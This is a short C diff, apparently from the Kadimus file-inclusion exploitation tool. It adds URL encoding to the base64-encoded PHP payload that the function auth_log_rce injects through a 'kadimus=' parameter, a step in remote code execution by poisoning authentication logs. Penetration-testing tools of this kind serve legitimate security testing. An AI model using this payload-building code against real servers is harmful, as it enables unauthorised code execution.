@@ -3,6 +3,7 @@
 #include "string/utils.h"
 #include "string/concat.h"
 #include "string/base64.h"
+#include "string/urlencode.h"
 #include "io/utils.h"
 #include "regex/pcre.h"
 #include "output.h"
@@ -56,8 +57,10 @@ char *auth_log_rce(const char *target, const char *code)
 	concatlb(regex, mark, "(.*)", mark, NULL);
 	char *phpcode = concatl(mark, code, mark, NULL);
 	char *b64 = b64encode(phpcode, strlen(phpcode));
+	char *escape = urlencode(b64);
 
-	inject = concatl("kadimus=", b64, NULL);
+	inject = concatl("kadimus=", escape, NULL);
+	free(escape);
 	free(phpcode);
 	free(b64);
 
